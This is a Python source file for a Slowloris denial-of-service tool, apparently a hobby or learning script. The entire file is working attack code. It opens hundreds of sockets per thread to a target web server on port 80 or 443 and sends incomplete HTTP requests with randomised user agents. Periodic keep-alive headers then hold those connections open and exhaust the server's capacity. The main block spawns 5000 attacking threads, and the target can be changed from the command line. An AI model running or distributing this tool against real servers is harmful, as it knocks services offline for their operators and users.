import socket
import threading
import random
import time
import sys
import logging
import ssl as hook

class SlowLoris:

    def __init__(self, ip=None, max_sockets=None, ssl=None, log_filename=None, log_level=None):
        self.default_values = {'ip': '127.0.0.1', 'max_sockets': 100, 'ssl': True, 'log_filename': 'Slow-Loris.txt',
                               'log_level': 0}
        try:
            ip = sys.argv[1]
            max_sockets = sys.argv[2]
            ssl = sys.argv[3]
            log_filename = sys.argv[4]
            log_level = sys.argv[5]
        except Exception:
            pass

        self.ip = ip if (ip is not None) else self.default_values['ip']
        self.ssl = ssl if (ssl is not None) else self.default_values['ssl']
        self.max_sockets = max_sockets if (max_sockets is not None) else self.default_values['max_sockets']
        self.log_filename = log_filename if (log_filename is not None) else self.default_values['log_filename']
        self.log_level = log_level if (log_level is not None) else self.default_values['log_level']
        self.sockets = []
        if not ssl:

            try:
                host = socket.gethostbyname(self.ip)
                self.ip = host
            except Exception:
                pass

        logging.basicConfig(filename=self.log_filename, filemode='w',
                            format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger()
        self.logger.setLevel(logging.DEBUG)
        self.__log_print(
            f'New slow_loris class created with ip {self.ip} and max sockets {self.max_sockets}, logging to {self.log_filename} with log level {self.log_level}')

    def __log_print(self, message, log_type='i'):

        if (log_type == 'i' and self.log_level < 1):
            print(message)
            self.logger.info(message)
        elif (log_type == 'd' and self.log_level < 1):
            print(message)
            self.logger.debug(message)
        elif (log_type == 'e' and self.log_level < 2):
            print(message)
            self.logger.error(message)
        elif (log_type == 'w' and self.log_level < 2):
            print(message)
            self.logger.warning(message)
        elif (log_type == 'c' and self.log_level < 3):
            print(message)
            self.logger.critical(message)
        else:
            print(message)
            self.logger.critical(f'Log Level Not Appropriate - {message}')

    def __get_user_agent(self):
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246',
            'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9'
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
            'Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36',
            'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 5.1.1; SM-G928X Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 6.0; HTC One X10 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1',
            'Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254',
            'Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
            'Mozilla/5.0 (CrKey armv7l 1.5.16041) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.0 Safari/537.36',
            'Roku4640X/DVP-7.70 (297.70E04154A)',
            'AppleTV6,2/11.1',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; XBOX_ONE_ED) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
            'Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+']
        return random.choice(user_agents)

    def __get_language(self):
        accepted_languages = ['en-US,en;q=0.9', 'en-US,fr-CA', 'en-GB, en;q=0.7', 'hy', 'hz', 'ia', 'ja', 'jv', 'iw', 'zh-Hant-SG', 'zh-yue', 'ru', 'rw', 'ro', 'rm', 'af']
        return random.choice(accepted_languages)

    def __create_sockets(self):
        for i in range(self.max_sockets):
            self.__create_socket()

    def __create_socket(self):
        if self.ssl:
            while True:
                try:
                    ctx = hook.create_default_context()
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s = ctx.wrap_socket(s, server_hostname=self.ip)
                    s.connect((self.ip, 443))
                    break
                except Exception as e:
                    pass
        else:
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((self.ip, 80))
                    break
                except Exception:
                    pass
        self.send_request(s)
        self.send_headers(s)
        self.sockets.append(s)

    def send_headers(self, s):
        s.send(bytes(f"User-agent: {self.__get_user_agent()}\r\n".encode("utf-8")))
        s.send(bytes(f"Accept-language: {self.__get_language()}\r\n".encode("utf-8")))

    def send_request(self, s):
        s.send(f"GET /?{random.randint(0, 3000)} HTTP/1.1\r\n".encode("UTF-8"))

    def attack(self):
        self.__create_sockets()
        self.__log_print('Attack started')
        while True:
            for s in self.sockets:
                try:
                    s.send(f"X-a: {random.randint(0, 10000)}\r\n".encode("UTF-8"))  # Keep alive
                except socket.error:
                    self.sockets.remove(s)
                    self.__create_socket()

            time.sleep(2)

if (__name__ == '__main__'):
    ip = 'localhost'
    max_sockets = 200
    thread_count = 5000
    ssl = False
    threads = []
    slow_loris = []
    for i in range(thread_count):
        slow_loris.append(SlowLoris(ip, max_sockets, ssl))
        threads.append(threading.Thread(target=slow_loris[i].attack))
        threads[i].start()
